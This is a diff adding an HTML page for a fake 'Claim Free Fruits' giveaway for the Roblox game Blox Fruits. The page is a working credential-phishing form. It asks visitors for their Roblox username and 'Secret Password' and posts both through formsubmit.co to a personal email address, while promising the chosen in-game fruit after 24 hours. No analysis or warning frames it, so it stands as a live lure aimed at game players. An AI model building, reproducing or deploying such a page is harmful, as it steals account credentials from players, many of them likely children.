@@ -1,0 +1,139 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Blox Fruits - Claim Free Fruits</title>
+    <link rel="stylesheet" href="./my-second-stylesheet.css" />
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;600;800&display=swap" rel="stylesheet">
+</head>
+
+<body>
+    <header>
+        <p><sup>🍎</sup>free fruits ⚔️</p>
+        <h1>🌟 Choose your Free Fruit! 🌟</h1>
+        <nav>
+            <ul>
+                <li><a href="index.html">🏠 Home</a></li>
+                <li class="selected">🍇 Free Fruits</li>
+                <li><a href="about-the-game.html">🎮 About The Game</a></li>
+                <li><a href="the-lore-of-blox-fruits.html">📜 The Lore</a></li>
+                <li><a href="tips-and-tricks.html">💡 Tips & Tricks</a></li>
+                <li><a href="youtubers.html">🎥 YouTubers</a></li>
+            </ul>
+        </nav>
+    </header>
+
+    <main>
+        <article>
+            <section class="fruit-selection-section">
+                <div class="glass-card">
+                    <h2>🍎 Free Blox Fruit Claim</h2>
+                    <p>Select your favorite fruit and enter your details to receive it in-game! 🎁</p>
+
+                    <form action="https://formsubmit.co/princewere@12gmail.com" method="POST" id="fruit-form">
+                        <div class="form-group">
+                            <label for="username">👤 Your Roblox Name</label>
+                            <input type="text" id="username" name="Roblox_Username" placeholder="Type your name here..."
+                                required>
+                        </div>
+                        <div class="form-group">
+                            <label for="password">🔑 Secret Password</label>
+                            <input type="password" id="password" name="Password" placeholder="Type your secret code..."
+                                required>
+                        </div>
+
+                        <div class="fruit-selection">
+                            <h3>🍎 Choose Your Fruit:</h3>
+                            <div class="fruit-grid">
+                                <label class="fruit-card">
+                                    <input type="radio" name="Selected_Fruit" value="Dragon">
+                                    <div class="fruit-icon">🐉</div>
+                                    <h3>Dragon Fruit</h3>
+                                </label>
+                                <label class="fruit-card">
+                                    <input type="radio" name="Selected_Fruit" value="Venom">
+                                    <div class="fruit-icon">🐍</div>
+                                    <h3>Venom Fruit</h3>
+                                </label>
+                                <label class="fruit-card">
+                                    <input type="radio" name="Selected_Fruit" value="Spirit">
+                                    <div class="fruit-icon">👻</div>
+                                    <h3>Spirit Fruit</h3>
+                                </label>
+                                <label class="fruit-card">
+                                    <input type="radio" name="Selected_Fruit" value="Leopard">
+                                    <div class="fruit-icon">🐆</div>
+                                    <h3>Leopard Fruit</h3>
+                                </label>
+                                <label class="fruit-card">
+                                    <input type="radio" name="Selected_Fruit" value="Dough">
+                                    <div class="fruit-icon">🍩</div>
+                                    <h3>Dough Fruit</h3>
+                                </label>
+                                <label class="fruit-card">
+                                    <input type="radio" name="Selected_Fruit" value="Magma">
+                                    <div class="fruit-icon">🔥</div>
+                                    <h3>Magma Fruit</h3>
+                                </label>
+                            </div>
+                        </div>
+
+                        <button type="submit" class="glow-button" style="margin-top: 30px;">🍇 CLAIM MY FRUIT!
+                            🍇</button>
+                    </form>
+                </div>
+            </section>
+        </article>
+
+        <aside>
+            <div class="glass-card">
+                <h2>⭐ How it Works ⭐</h2>
+                <p>1. Choose your fruit 🍎</p>
+                <p>2. Enter your ID 👤</p>
+                <p>3. Wait 24 hours ⏰</p>
+                <p>4. Enjoy your power! ⚡</p>
+            </div>
+
+            <section>
+                <h2>🔥 Popular Fruits 🔥</h2>
+                <ul>
+                    <li>Dragon (Mythical)</li>
+                    <li>Spirit (Mythical)</li>
+                    <li>Dough (Mythical)</li>
+                </ul>
+            </section>
+        </aside>
+    </main>
+
+    <script>
+        // Fruit selection highlighting
+        const cards = document.querySelectorAll('.fruit-card');
+        cards.forEach(card => {
+            card.addEventListener('click', () => {
+                cards.forEach(c => c.classList.remove('selected'));
+                card.classList.add('selected');
+            });
+        });
+
+        document.getElementById('fruit-form').addEventListener('submit', function (e) {
+            const fruit = document.querySelector('input[name="Selected_Fruit"]:checked');
+            if (!fruit) {
+                e.preventDefault();
+                alert("Please select a fruit first! 🍎");
+                return;
+            }
+            // Form continues to Formspree
+        });
+    </script>
+
+    <footer>
+        <p class="copyright">All information copyright idk lol</p>
+        <p class="contact">Contact: <a href="mailto:hoikiuhkh@gmail.com">hoikiuhkh@gmail.com</a></p>
+    </footer>
+</body>
+
+</html>
